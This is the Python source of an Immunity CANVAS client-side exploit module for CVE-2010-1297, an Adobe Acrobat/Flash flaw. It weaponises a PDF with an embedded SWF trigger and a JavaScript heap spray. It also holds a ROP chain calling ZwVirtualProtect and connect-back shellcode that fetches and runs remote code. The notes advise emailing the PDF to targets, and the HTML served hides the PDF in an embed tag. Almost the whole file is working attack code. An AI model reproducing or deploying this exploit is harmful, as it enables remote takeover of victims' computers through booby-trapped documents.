##ImmunityHeader v1 
###############################################################################
## File       :  flash_newfunction.py
## Description:  
##            :  
## Created_On :  Mon Jun 14 10:00:40 2010
## Created_By :  Nicolas Pouvesle
##
## (c) Copyright 2010, Immunity, Inc. all rights reserved.
###############################################################################
#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2010
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import socket
import time
import struct

from exploitutils import *
from tcpexploit import *
from MOSDEF import mosdef
from httpclientside import httpclientside
from encoder import xorencoder
import canvasengine #for canvas_root_dir

NAME='Adobe Acrobat Flash Invalid newfunction call'
DESCRIPTION='Adobe Acrobat Flash Invalid newfunction call'

DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Adobe"
DOCUMENTATION['Date public']='06/04/10'
DOCUMENTATION['References']='http://www.adobe.com/support/security/advisories/apsb10-14.html'
DOCUMENTATION['Repeatability']=''
DOCUMENTATION['CVE Name']='CVE-2010-1297'
DOCUMENTATION['CVE URL']='http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-1297'
DOCUMENTATION['CVSS'] = 9.3
DOCUMENTATION['VersionsAffected']='Acrobat 9.3 and below'
DOCUMENTATION['NOTES']='Exploitation through an PDF file is more reliable than with a direct HTML/Flash exploit'

VERSION='1.0'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['XP']
PROPERTY['DELIVERY']='HTTP'
NOTES="""
Tested on:
Windows XP Professional SP3 English UP2DATE with Adobe Acrobat Reader 9.3 (IE8, Firefox, PDF)

Also tested on Simplified Chinese Windows/Acrobat Reader 9.3

You do NOT want to use js_recon when using this exploit! (For this reason,
it is disabled when you are using clientd's autodetection).

This exploit works best when creating a PDF file and emailing that to your targets.

Usage:
./commandlineInterface.py -p 5555 -v 1
./exploits/httpserver/httpserver.py -v 1 -O singleexploit:flash_newfunction -l 10.10.11.1 -d 5555 -p 8080  
"""

CHANGELOG="""
"""

targets={
    0: ['Autodetect',0],
    1: ['Windows XP SP3 Eng',0x42424242]
}

from libs.pyPdf.pdf import *
from libs.pyPdf.generic import *
from libs.pyPdf.filters import *


class vsc_win32(shellcodeGenerator.win32):
    """
    Derives from our previous one, but has our cleanup code in it.
    """
    
    def __init__(self):
        shellcodeGenerator.win32.__init__(self)
        self.handlers["flash_newfunction_cleanup"]=self.flash_newfunction_cleanup
        self.vProtectSelf = False
    
    def flash_newfunction_cleanup(self, args):
        """
        """
        self.code+="""
xorl %ecx,%ecx
movl 0x07018E10(%ecx), %ebp
xorl %eax, %eax
movl %ebp, %esp
addl $0x4C0, %esp
l_ebx:
pop %ebx
cmp $0x373, %ebx
je next
jmp l_ebx
next:
pop %edi
pop %esi
pop %ebp
addl $0x88, %esp
ret $4
"""


class theexploit(httpclientside):
    def __init__(self):
        tcpexploit.__init__(self)
        httpclientside.__init__(self)
        self.setInfo(DESCRIPTION)
        self.clientversion=1
        self.badstring='\0\xff'
        self.name=NAME 
        self.htmlfilename     = 'wild.html'
        self.source_pdf       = 'Resources/blank.pdf'
        self.source_trigger   = 'Resources/flash_newfunction/Main.swf'
        self.dest_pdf         = 'temp.pdf'
        
        self.no_auto_detect = True #this tells clientd not to choose us when auto-detecting!
        return

        
    def is_vulnerable( self, info_dict ):
        major, minor, build, patch = self.getReaderVersions(info_dict)
        if not major:
            self.log("No Acrobat Reader available to target")
            return 0

        if "Windows" not in info_dict["user_agent"]:
            self.log("Target not running Windows")
            return 0

        # flash heap layout only works with 9.3.2
        if major == 9:
            if minor == 3:
                if build <= 2:
                    return 70
            
                
        return 0

    def createShellcode(self):
        import shellcode.standalone.windows.payloads as payloads
        
        self.log('Connect back information: %s:%d' % (self.callback.ip,self.callback.port))
        self.callback.argsDict["fromcreatethread"] = 0
        proxy_payload = ""
        try:
            # this stuff is only used when served in HTTP MOSDEF mode
            if hasattr(self, 'HTTPMOSDEF') and self.HTTPMOSDEF == True:
                # make sure that fromcreatethread is set to 0 in your
                # httpserver/exploit listenerArgsDict!

                p   = payloads.payloads()
                sc  = p.http_proxy(self.callback.ip, self.callback.port, SSL=self.useSSLMOSDEF)
                proxy_payload = p.assemble(sc)
        except:
            pass
        
        if not proxy_payload:
            mosdef_type=self.engine.getMosdefType(canvasengine.WIN32MOSDEF_INTEL)
            mosdef_id=self.engine.getNewMosdefID(self)
            sc = shellcodeGenerator.win32()
            sc.addAttr("findeipnoesp",{"subespval": self.subesp}) #don't mess with eip
            sc.addAttr("revert_to_self_before_importing_ws2_32", None)
            sc.addAttr("tcpconnect", {"port" : self.callback.port, "ipaddress" : self.callback.ip})
            sc.addAttr("send_universal", {"mosdef_type": mosdef_type, "mosdef_id": mosdef_id})
            sc.addAttr("loadFDasreg", {"reg" : "esi"})
            sc.addAttr("RecvExecDepSafe", None) #MOSDEF
            sc.addAttr("ExitProcess",None)
            proxy_payload = sc.get()
        
        sc = vsc_win32()
        sc.addAttr("findeipnoesp", {"subespval": 0x1000})
        sc.addAttr("InjectToSelf", { "injectme" : proxy_payload, "movetostack" : True, "DONTEXIT" : True })
        sc.addAttr("flash_newfunction_cleanup", None)
        rawshellcode=sc.get()
        
        #fix ESP before doing anything else
        self.shellcode = mosdef.assemble("""
xorl %ecx,%ecx
movl %ebp, 0x07018E10(%ecx)
andl $0xFFFFFF00, %esp
""", "x86")+rawshellcode
        if len(self.shellcode) % 4:
            self.shellcode += "\x90"*(4-(len(self.shellcode) % 4))
        
        self.log("Shellcode size:0x%x"%len(self.shellcode))
        return self.shellcode


    def createShellcode2(self):
        host=self.callback.ip
        port=self.callback.port
        httpWrapper=''
        try:
            if self.HTTPMOSDEF:
                print '[!] using HTTP MOSDEF tunneling ..'
                sc=shellcodeGenerator.win32()
                sc.addAttr('findeipnoesp',{'subespval':0x1000})
                if self.useSSLMOSDEF:
                    ssl='s'
                else:
                    ssl=''
                sc.addAttr('httpGetShellcode',{'URL':'http%s://%s:%d'%(ssl,host,port)})
                httpWrapper=sc.get()
                print '[!] HTTP MOSDEF len: %d bytes'%(len(httpWrapper))
        except:
            httpWrapper=''
        rawshellcode=self.createInjectToSelf(host,port,injectme=httpWrapper,movetostack=True)
        from encoder import chunkedaddencoder
        encoder=chunkedaddencoder.intelchunkedaddencoder()
        encoder.setbadstring(self.badstring)
        self.shellcode=encoder.encode(rawshellcode)
        return self.shellcode

    def addRichMedia(self,page, buffer, swffilename,x1,y1,x2,y2):
        annot=DictionaryObject()

        appearance=DictionaryObject()
        appearance[NameObject("/Subtype")]=NameObject("/Form")
        appearance[NameObject("/Matrix")]=ArrayObject([NumberObject("1"), NumberObject("0"), NumberObject("0"), NumberObject("1"), NumberObject("0"), NumberObject("0")])
        appearance[NameObject("/BBox")]=ArrayObject([NumberObject("0"), NumberObject("0"), NumberObject("30"), NumberObject("30")])

        annot[NameObject('/Type')]=NameObject("/Annot")
        annot[NameObject('/Subtype')]=NameObject("/RichMedia")
        annot[NameObject('/NM')]=TextStringObject(swffilename)
        annot[NameObject('/AP')]=DictionaryObject( { NameObject("/N") : appearance } )
        annot[NameObject('/F')]=NumberObject(68)
        annot[NameObject('/Rect')]=ArrayObject([NumberObject(x1), NumberObject(y1), NumberObject(x2), NumberObject(y2)])

        data=StreamObject()
        data._data=buffer
        data[NameObject("/DL")]=NumberObject(len(buffer))
        data[NameObject("/Params")]=DictionaryObject( { NameObject("/Size"):NumberObject(len(buffer)) } )

        filespec=DictionaryObject( { NameObject("/Type"):NameObject("/Filespec"), \
                                     NameObject("/F"):TextStringObject(swffilename), \
                                     NameObject("/UF"):TextStringObject(swffilename), \
                                     NameObject("/EF"):DictionaryObject( { NameObject("/F"):data } ) } )

        #config the player
        config = DictionaryObject()
        config[NameObject("/Type")]=NameObject("/RichMediaConfiguration")
        config[NameObject("/Subtype")]=NameObject("/Flash")
        config[NameObject("/Instances")]=ArrayObject()

        instance=DictionaryObject()
        instance[NameObject("/Params")]=DictionaryObject( { NameObject("/Binding"):TextStringObject("Background") } )
        instance[NameObject("/Asset")]=filespec
        config["/Instances"].append(instance)

        #activate as soon as any part of the page that contains the annotation becomes visible, deactivate at user request
        activation = DictionaryObject( { NameObject("/Condition") : NameObject("/XA"),\
                                         NameObject("/Type") : NameObject("/RichMediaActivation"),\
                                         NameObject("/Configuration") : config } )
        deactivation = DictionaryObject( { NameObject("/Condition") : NameObject("/XD"),\
                                           NameObject("/Type") : NameObject("/RichMediaDeactivation") } )

        annot[NameObject('/RichMediaSettings')]=DictionaryObject( { NameObject("/Activation"):activation,\
                                                                               NameObject("/Deactivation"):deactivation,\
                                                                                          NameObject("/Configuration"):config } )


        annot[NameObject('/RichMediaContent')]=DictionaryObject( { NameObject("/Configurations"):ArrayObject( [ config ] ),\
                                                                   NameObject("/Assets"):\
                                                                   DictionaryObject( { \
                                                                       NameObject("/Names"):\
                                                                       ArrayObject( [ TextStringObject(swffilename), filespec ] ) \
                                                                   } ) } )

        page['/Annots'].append(annot)

        return True

    def makeJS2(self):
        js = """
function format_dword(num) {
  tmp=num.toString(16);
  tmp="00000000".substring(0,8-tmp.length)+tmp;
  return unescape("%u"+tmp.substring(4,8) + "%u" + tmp.substring(0,4));
}

sprayer = new Array();

chain = "";
while (chain.length < 0x4F4) chain+="\u0A0A";

chain += "\u0A0A";

chain += format_dword(0x0A0A0A1A);  // eax/esp value
chain += format_dword(0xCCCCCCCC);
chain += format_dword(0xCCCCCCCC);
chain += format_dword(0x0700BD50);  // 1) mov eax, [ecx]; call [eax+8]
chain += format_dword(0x07005A6D);  // 3) add esp, 8; ret
chain += format_dword(0xCCCCCCCC);
chain += format_dword(0x070012BB);  // 2) xchg eax, esp; ret
chain += format_dword(0x070072F7);  // 4) pop eax; ret
chain += format_dword(0x00000089);  //    eax -> 89 (ZwVirtualProtect)
chain += format_dword(0x070015BB);  // 5) pop ecx; ret
chain += format_dword(0x7FFE0300-0x89);  //    ecx -> sysenter pointer
chain += format_dword(0x07002143);  // 6) jmp [ecx+eax]
chain += format_dword(0x0A0A0A60);  // return address for vprotect -> shellcode
chain += format_dword(0x00000000);  // not used
chain += format_dword(0xFFFFFFFF);  // ProcessHandle
chain += format_dword(0x0A0A0A56);  // BaseAddress
chain += format_dword(0x0A0A0A5A);  // NumberOfBytesToProtect
chain += format_dword(0x00000040);  // NewAccessProtection
chain += format_dword(0x0A0A0A5A);  // OldAccessProtection
chain += format_dword(0x0A0A0A60);  // base address
chain += format_dword(0x00001000);  // bytes
chain += "\u4242";
chain += unescape("SHELLCODE");


while (chain.length < 0x10000) chain+="\u0A0A";


bigblock = chain;
while (bigblock.length < 0x90000) bigblock += bigblock;

for (i =0; i<0x120; i++) {
  sprayer[i] = bigblock + "lol";
}

""".replace('SHELLCODE',urluencode(self.shellcode))

        # acrobat reader does not like JSObfuscator()
        return self.obfuscate_javascript(js)


    def makePDF(self):
        input=PdfFileReader(file(self.source_pdf,'rb'))

        pages = []
        for i in range(0,input.getNumPages()):
            pages.append(input.getPage(i))

        page= pages[0] #input.getPage(0)
        #page[NameObject("/MediaBox")]=ArrayObject((NumberObject(0),NumberObject(0),NumberObject(600),NumberObject(800)))
        ann = NameObject('/Annots')
        if not ann in page:
            page[ann]=ArrayObject()
        
        res = page["/Resources"].getObject()
        xobj = NameObject('/XObject')
        if not xobj in res:
            res[xobj]=DictionaryObject()


        self.addRichMedia(page, file(self.source_trigger,"rb").read(), "lolol.swf",0,400,0,400)

        #create the js entry first
        input.trailer['/Root'][NameObject('/Names')] = DictionaryObject()
        input.trailer['/Root']['/Names'][NameObject('/JavaScript')] = DictionaryObject()
        input.trailer['/Root']['/Names']['/JavaScript'][NameObject('/Names')] = ArrayObject()
        input.trailer['/Root']['/Names']['/JavaScript']['/Names'].append(TextStringObject('0000000000000000'))
        input.trailer['/Root']['/Names']['/JavaScript']['/Names'].append(DictionaryObject())
        
        #set the js content
        jsobject=StreamObject()
        jsobject._data=self.makeJS2()
        jsdict=input.trailer['/Root']['/Names']['/JavaScript']['/Names'][1].getObject()
        jsdict[NameObject('/S')]=NameObject('/JavaScript')
        jsdict[NameObject('/JS')]=jsobject.flateEncode()

        output=PdfFileWriter()
        
        for p in pages :
            output.addPage(p)

        root=output._root.getObject()
        root.update({NameObject('/Names'):input.trailer['/Root']['/Names']})
        
        output.write(file(self.dest_pdf,'wb'))
        return file(self.dest_pdf,'rb').read()

    def makeHTML(self):
        webpage="<HTML>\n"
        webpage+="<EMBED src=\"%s\" HIDDEN=\"TRUE\" ></EMBED>\n"%(self.dest_pdf)
        webpage+="</HTML>\n"
        return webpage

    def makesploit(self,clientheader,clientbody):
        from libs.spkproxy import header,body
        h=header('SERVER')
        b=body()
        if clientheader.URL.count(self.htmlfilename):
            self.log('Serving HTML file')
            b.setBody(self.makeHTML())
            h.addHeader('Content-Type','text/html')
        elif clientheader.URL.count(self.dest_pdf):
            self.log('Serving PDF file')
            self.createShellcode()
            b.setBody(self.makePDF())
            h.addHeader('Content-Type','application/pdf')
        else:
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.htmlfilename)
            h.addHeader('Content-Type','text/html')
        return h,b

    def getArgs(self):
        self.host=self.target.interface
        self.source_pdf=self.argsDict.get('source_filename',self.source_pdf)
        self.dest_pdf=self.argsDict.get('dest_filename', self.dest_pdf)
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'Version %d: %s'%(t,targets[t][0])
        return

    def run(self):
        self.getArgs()
        self.filedata=self.makePDF()
        self.log('Opening %s for output'%(self.dest_pdf))
        fd=file(self.dest_pdf,'wb+')
        fd.write(self.filedata)
        fd.close()
        self.log('Wrote to %s'%(self.dest_pdf))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app=theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
